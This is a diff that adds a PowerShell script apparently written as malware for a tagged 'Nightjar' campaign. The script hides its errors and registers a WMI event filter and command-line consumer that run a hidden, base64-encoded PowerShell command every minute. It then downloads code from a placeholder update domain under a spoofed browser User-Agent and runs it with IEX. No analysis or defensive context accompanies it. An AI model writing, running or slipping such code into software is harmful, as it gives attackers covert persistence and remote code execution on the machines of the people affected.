@@ -1,0 +1,23 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$tag = "NJ-CAMPAIGN-0x5A"
+
+$FilterName   = "NightjarFilter"
+$ConsumerName = "NightjarConsumer"
+$Cmd = "powershell -nop -w hidden -enc JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4A"
+
+$wmi = [wmiclass]"\\.\root\subscription:__EventFilter"
+$f = $wmi.CreateInstance()
+$f.Name = $FilterName
+$f.QueryLanguage = "WQL"
+$f.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
+$f.Put()
+
+$wmi2 = [wmiclass]"\\.\root\subscription:CommandLineEventConsumer"
+$c = $wmi2.CreateInstance()
+$c.Name = $ConsumerName
+$c.CommandLineTemplate = $Cmd
+$c.Put()
+
+$w = New-Object Net.WebClient
+$w.Headers.Add("User-Agent","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)")
+IEX ($w.DownloadString("http://cdn.nightjar-update.example/api/v2/task"))
